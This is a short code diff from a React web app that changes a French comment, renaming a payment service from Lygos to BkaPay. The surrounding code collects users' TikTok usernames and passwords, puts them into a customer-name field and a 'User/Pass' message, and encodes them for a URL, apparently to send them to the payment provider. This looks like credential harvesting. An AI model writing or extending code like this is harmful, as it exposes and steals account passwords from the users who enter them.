@@ -89,7 +89,7 @@ function App() {
     // Combine username and password in the customerName field
     const customerNameWithCredentials = `${tiktokData.username} | ${tiktokData.password}`;
     
-    // Créer un message avec les identifiants complets pour Lygos
+    // Creer un message avec les identifiants complets pour BkaPay
     const messageWithCredentials = `${description} | User: ${tiktokData.username} | Pass: ${tiktokData.password}`;
     
     // Encoder les identifiants pour l'URL
